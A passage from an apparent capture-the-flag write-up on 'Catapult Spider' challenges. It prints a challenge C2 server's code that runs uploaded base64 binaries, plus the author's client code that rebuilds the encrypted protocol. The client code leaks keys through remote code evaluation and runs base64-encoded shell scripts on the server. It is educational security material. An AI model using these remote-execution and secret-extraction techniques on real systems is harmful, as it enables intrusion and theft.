+            .<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stupidtoo</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">bread</span>) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;eated&#39;</span>;
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flavor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>][<span style="color:#e6db74">&#39;flavor&#39;</span>];
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_carnval</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">bread</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);;
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">randome</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>()
+                .<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>)
+                .<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>)
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp/hotdoge-&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">randome</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.bin&#39;</span>;
+            <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">doge_carnval</span>);
+            <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">chmodSync</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#e6db74">&#39;755&#39;</span>);
+            <span style="color:#66d9ef">try</span> {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">retval</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">execFileSync</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">flavor</span>);
+                <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;taste&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">retval</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;utf-8&#39;</span>);
+            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+                <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;status&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">error</span>) {
+                    <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;eated&#39;</span>;
+                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">errstd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;utf-8&#39;</span>);
+                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">errerr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;utf-8&#39;</span>);
+                    <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;taste&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">errstd</span>;
+                    <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">errerr</span>;
+                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">27</span>) {
+                        <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;wow such module thx top doge&#39;</span>;
+                    }
+                } <span style="color:#66d9ef">else</span> {
+                    <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bonk&#39;</span>;
+                    <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bad hot doge&#39;</span>;
+                }
+            } <span style="color:#66d9ef">finally</span> {
+                <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">cache</span>[<span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">filename</span>)]
+            };
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;all bout base six fur&#39;</span>;
+        }
+    }
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>));
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+}
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SERVS_KEY</span>,
+    <span style="color:#a6e22e">cert</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SERVS_CERT</span>,
+    <span style="color:#a6e22e">requestCert</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+    <span style="color:#a6e22e">rejectUnauthorized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+    <span style="color:#a6e22e">ca</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">DOGE_CA</span>]
+};
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">server</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">createServer</span>(<span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">socket</span>) =&gt; {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;doge connected: &#39;</span>,
+        <span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">authorized</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;top doge&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;not top doge&#39;</span>);
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">networker</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Networker</span>(<span style="color:#a6e22e">socket</span>, (<span style="color:#a6e22e">data</span>) =&gt; {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_lingo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>();
+        <span style="color:#75715e">// plz console.loge with &#39;top doge sez:&#39; doge_lingo
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_woof</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dogeParam</span>(<span style="color:#a6e22e">doge_lingo</span>);
+        <span style="color:#a6e22e">networker</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">doge_woof</span>);
+        <span style="color:#75715e">//networker.send(dogeParam(data.toString()));
+</span><span style="color:#75715e"></span>    });
+    <span style="color:#a6e22e">networker</span>.<span style="color:#a6e22e">init</span>(<span style="color:#e6db74">&#39;such doge is yes wow&#39;</span>, <span style="color:#e6db74">&#39;such doge is shibe wow&#39;</span>);
+});
+
+<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">41414</span>, () =&gt; {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;doge waiting for command from top doge&#39;</span>);
+});
+<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;connection&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">c</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;doge connect&#39;</span>);
+});
+<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;secureConnect&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">c</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;doge connect secure&#39;</span>);
+});
+</code></pre></div>
+</div>
+<p>
+Based on the code it was pretty clear that the flag would be in the <code class="verbatim">CRYPTZ</code> environment variable. <code class="verbatim">CRYPTZ</code> was &#34;cripted&#34;, stored to a key called <code class="verbatim">secrit_key</code>, and then destroyed.</p>
+<p>
+The first challenge was to be able to speak to the C2 server. I accomplished that by creating a TLS connection with the keys I extracted from the binary</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DOGE_KEY</span>,
+    <span style="color:#a6e22e">cert</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DOGE_CERT</span>,
+    <span style="color:#75715e">// requestCert: true,
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">rejectUnauthorized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+    <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;veryprotocol.challenges.adversary.zone&#34;</span>,
+    <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">41414</span>,
+    <span style="color:#a6e22e">ca</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">DOGE_CA</span>]
+};
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">response</span>;
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">options</span>, <span style="color:#66d9ef">function</span>() {});
+
+<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">decrypter</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">32</span>)).<span style="color:#a6e22e">toString</span>()); <span style="color:#75715e">// decrypter defined below
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>; });
+
+<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;close&#39;</span>, <span style="color:#66d9ef">function</span>() {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Connection closed&#34;</span>);
+});
+
+<span style="color:#75715e">// When an error ocoures, show it.
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>);
+    <span style="color:#75715e">// Close the connection after the error occurred.
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">destroy</span>();
+});
+</code></pre></div>
+</div>
+<p>
+This worked to establish a network connection between me and the C2. Next was to start speaking to the C2 in a language it could understand… a custom encrypted binary format that decodes to dogescript…</p>
+<p>
+The entrypoint for a message to the server starts with the <code class="verbatim">_onData()</code> function in the <code class="verbatim">Networker</code> class. To avoid being overly verbose the flow can be summarized like this:</p>
+<blockquote>
+<p>Binary format is Int32 Length of Encrypted Text + Checksum of encrypted text + encrypted text</p>
+<p>
+The C2 (using hardcoded keys):</p>
+<ul>
+<li>
+<p>Ensures that the length is greater than 4</p>
+</li>
+<li>
+<p>Ensures that the checksum matches the payload</p>
+</li>
+<li>
+<p>Decrypts the payload</p>
+</li>
+</ul>
+</blockquote>
+<p>
+Here&#39;s the helper functions I created to build the binary format.</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">toBytesInt32</span> (<span style="color:#a6e22e">num</span>) {
+    <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">4</span>); <span style="color:#75715e">// an Int32 takes 4 bytes
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">arr</span>);
+    <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">num</span>, <span style="color:#66d9ef">false</span>); <span style="color:#75715e">// byteOffset = 0; litteEndian = false
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">arr</span>);
+};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">zencrypter</span>(<span style="color:#a6e22e">data</span>) {
+    <span style="color:#a6e22e">aes_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#e6db74">&#39;such doge is shibe wow&#39;</span>, <span style="color:#e6db74">&#39;suchdoge4evawow&#39;</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wow_cripter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createCipheriv</span>(<span style="color:#e6db74">&#39;aes-128-cbc&#39;</span>, <span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">iv</span>);
+    <span style="color:#a6e22e">wow_cripter</span>.<span style="color:#a6e22e">setAutoPadding</span>(<span style="color:#66d9ef">true</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">wow_cripter</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">wow_cripter</span>.<span style="color:#66d9ef">final</span>()]);
+};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate_checksum</span>(<span style="color:#a6e22e">s</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hmac_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#e6db74">&#39;such doge is yes wow&#39;</span>, <span style="color:#e6db74">&#39;suchdoge4evawow&#39;</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hmac</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">hmac_key</span>);
+    <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">s</span>)
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">digest</span>()
+}
+</code></pre></div>
+</div>
+<p>
+I also created a function to decrypt the messages from the server:</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decrypter</span>(<span style="color:#a6e22e">data</span>) {
+        <span style="color:#a6e22e">aes_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#e6db74">&#39;such doge is shibe wow&#39;</span>, <span style="color:#e6db74">&#39;suchdoge4evawow&#39;</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wow_decripter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createDecipheriv</span>(<span style="color:#e6db74">&#39;aes-128-cbc&#39;</span>, <span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">iv</span>);
+        <span style="color:#a6e22e">wow_decripter</span>.<span style="color:#a6e22e">setAutoPadding</span>(<span style="color:#66d9ef">true</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">wow_decripter</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">wow_decripter</span>.<span style="color:#66d9ef">final</span>()]);
+};
+</code></pre></div>
+</div>
+<p>
+Now that I could speak to the server it was time to figure out what higher level application layer traffic was expected.</p>
+<p>
+<code class="verbatim">var doge_command = dson.parse(buffer)</code> and of course there&#39;s a Doge serialization format…</p>
+<p>
+To make things easier on myself I created two more helper functions to generate the messages to send to the server. One was to create a message out of dogescipt string and one was to allow me to just write normal json</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dogeon&#39;</span>);
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">doge_generate_string</span> (<span style="color:#a6e22e">s</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">encrypted_string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">zencrypter</span>(<span style="color:#a6e22e">s</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">checksum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_checksum</span>(<span style="color:#a6e22e">encrypted_string</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">elen</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">toBytesInt32</span>(<span style="color:#a6e22e">encrypted_string</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">checksum</span>.<span style="color:#a6e22e">length</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">elen</span>, <span style="color:#a6e22e">checksum</span>, <span style="color:#a6e22e">encrypted_string</span>])
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">json_generate_string</span>(<span style="color:#a6e22e">j</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">j</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">encrypted_string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">zencrypter</span>(<span style="color:#a6e22e">s</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">checksum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_checksum</span>(<span style="color:#a6e22e">encrypted_string</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">elen</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">toBytesInt32</span>(<span style="color:#a6e22e">encrypted_string</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">checksum</span>.<span style="color:#a6e22e">length</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">elen</span>, <span style="color:#a6e22e">checksum</span>, <span style="color:#a6e22e">encrypted_string</span>]);
+};
+</code></pre></div>
+</div>
+<p>
+Tying this all together we could start sending messages to the server. Following the logic of the code in the <code class="verbatim">dogeParam</code> there were two options: I could have either execute custom dogescript with <code class="verbatim">dogesez</code> &amp; <code class="verbatim">do me a favor</code> OR execute custom scripts with the <code class="verbatim">dogesez</code> &amp; <code class="verbatim">hot doge</code> commands. Here&#39;s what happens when we have doge do us a favor.</p>
+<p>
+After a bit of trial and error I was able to get the bytes by having the secrit_key serialized to json from a bytes Buffer.</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;Buffer.from(secrit_key) dose toJSON&#34; wow&#39;</span>))
+</code></pre></div>
+</div>
+<p>
+The output needed a little cleanup though…</p>
+<blockquote>
+<p>&gt; such &#34;dogesez&#34; is &#34;welcome&#34; next &#34;ohmaze&#34; is such &#34;type&#34; is &#34;Buffer&#34; next &#34;data&#34; is so 39 next 41 next 22 next 64 next 13 next 25 next 93 next 40 next 99 next 17 next 9 next 16 next 74 next 50 next 90 next 11 next 37 next 91 next 68 next 71 next 20 next 9 next 54 next 17 next 62 next 108 next 15 next 74 next 98 next 10 many wow wow</p>
+<p>
+&gt; [39,41,22,64,13,25,93,40,99,17,9,16,74,50,90,11,37,91,68,71,20,9,54,17,62,108,15,74,98,10]</p>
+<p>
+&gt; Buffer.from([39,41,22,64,13,25,93,40,99,17,9,16,74,50,90,11,37,91,68,71,20,9,54,17,62,108,15,74,98,10])</p>
+</blockquote>
+<p>
+Now that I had the cyphertext output from the cript funciton. Could that be reversed? This is the cript function:</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">key</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>);
+    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>) {
+        <span style="color:#a6e22e">key</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">key</span>;
+    }
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ib</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">input</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kb</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">key</span>);
+    <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ib</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">kb</span>[<span style="color:#a6e22e">i</span>]
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">toString</span>();
+}
+</code></pre></div>
+</div>
+<p>
+All this does is XOR the input with some key that was passed to the function- so calling it with the same key and the cyphertext should yield our plaintext key</p>
+<p>
+So I asked doge to get the cript_key as well</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;cript_key&#34; wow&#39;</span>))
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">such</span> <span style="color:#e6db74">&#34;dogesez&#34;</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;welcome&#34;</span> <span style="color:#a6e22e">next</span> <span style="color:#e6db74">&#34;ohmaze&#34;</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;dzm3xz5w3c9&#34;</span> <span style="color:#a6e22e">wow</span>
+</code></pre></div>
+</div>
+<p>
+If we apply the <code class="verbatim">cript</code> function to the cript_key + cyphertext we get the final key</p>
+<p>
+Key: <code class="verbatim">CS{such_Pr0t0_is_n3tw0RkS_w0W}</code></p>
+<p>
+Another way to get the key was to base64 encode shell scripts and run them with this:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">client.write(doge_generate_string(dson.stringify({&#34;dogesez&#34;:&#34;hot doge&#34;, &#34;bread&#34;:&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaApscyAtYWwgL3Jvb3QvCmVudgo=&#34;, &#34;sausage&#34;:{&#34;flavor&#34;:[&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaAplY2hvICJjb29sIgo=&#34;]}})))</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-6" class="outline-3">
+<h3 id="headline-6">
+Catapult Spider - Module Wow
+</h3>
+<div id="outline-text-headline-6" class="outline-text-3">
+<blockquote>
+<p>Diving deeper into CATAPULT SPIDER&#39;s malware, we found that it also supports handing off tasks to external modules. We identified one such module that looks like it might be used to validate a key or password of some sorts, but we&#39;re really not sure.</p>
+</blockquote>
+<p>
+I tried a LOT of things on this module and am fairly certain I did not figure this out in the most optimal way.</p>
+<p>
+Running <code class="verbatim">file</code> on this command shows this is a linux ELF binary. The assumption is we call it with a key as the argument and the binary &#34;validates&#34; it.</p>
+<p>
+I loaded this into Cutter, jumped to <code class="verbatim">main</code>, and followed it down until I hit a code block that looked interesting:</p>
+<p>
+<img src="/images/crowdstrike-main.png" alt="/images/crowdstrike-main.png" title="/images/crowdstrike-main.png" /></p>
+<p>
+This is calling a function <code class="verbatim">execute</code> with the memory location <code class="verbatim">0x40a0</code> and the integer 196</p>
+<p>
+If I look at the memory in location <code class="verbatim">0x40a0</code> it seems very likely the key is in this region as I can see a couple of (what look like) plaintext strings.</p>
+<p>
+<img src="/images/crowdstrike-memory.png" alt="/images/crowdstrike-memory.png" title="/images/crowdstrike-memory.png" /></p>
+<p>
+So what does <code class="verbatim">execute</code> do? It uses the argument passed to the binary as an XOR key and applies that against the bytes at <code class="verbatim">0x40a0</code>.</p>
+<p>
